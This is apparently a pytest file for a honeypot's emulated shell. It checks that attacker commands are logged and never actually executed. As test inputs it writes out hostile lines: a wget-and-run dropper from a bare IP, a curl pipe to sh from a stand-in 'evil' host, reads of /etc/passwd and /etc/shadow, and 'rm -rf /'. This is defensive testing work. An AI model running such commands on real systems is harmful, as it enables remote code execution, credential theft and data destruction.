import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "honeypots"))
from hn.shell import FakeShell  # noqa: E402


def mk():
    ev = []
    return FakeShell(on_event=lambda e, **d: ev.append((e, d))), ev


def test_basic_commands_and_fs():
    sh, _ = mk()
    assert sh.run("whoami") == "root\n"
    assert "root:x:0:0" in sh.run("cat /etc/passwd")
    assert sh.run("cd /nonexistent").startswith("-bash: cd:")
    sh.run("mkdir /tmp/a && cd /tmp/a && echo hi > f.txt")
    assert sh.cwd == "/tmp/a" and sh.run("cat f.txt") == "hi\n"
    assert "cannot access" in sh.run("ls /nope")
    assert sh.run("cat /etc/shadow").endswith("Permission denied\n")
    assert sh.run("foo").endswith("command not found\n")


def test_dropper_flow_never_touches_network_and_logs_once():
    sh, ev = mk()
    sh.run("cd /tmp; wget http://1.2.3.4/a.sh; chmod +x a.sh; ./a.sh")
    urls = [d["url"] for e, d in ev if e == "download_attempt"]
    assert urls == ["http://1.2.3.4/a.sh"]
    assert "/tmp/a.sh" in sh.files and sh.run("./a.sh") == ""  # "executes" silently


def test_pipe_to_shell_and_busybox():
    sh, ev = mk()
    sh.run("curl -s http://evil/x | sh")
    assert any(e == "pipe_to_shell" for e, _ in ev)
    assert sh.run("busybox ZXCV") == "ZXCV: applet not found\n"


def test_exit_and_history():
    sh, _ = mk()
    sh.run("ls")
    sh.run("exit")
    assert sh.exited and "ls" in sh.run("history")


def test_never_executes_real_commands(tmp_path):
    sh, _ = mk()
    marker = tmp_path / "pwned"
    sh.run(f"touch {marker}; echo x > {marker}; rm -rf /; sudo touch {marker}")
    assert not marker.exists()
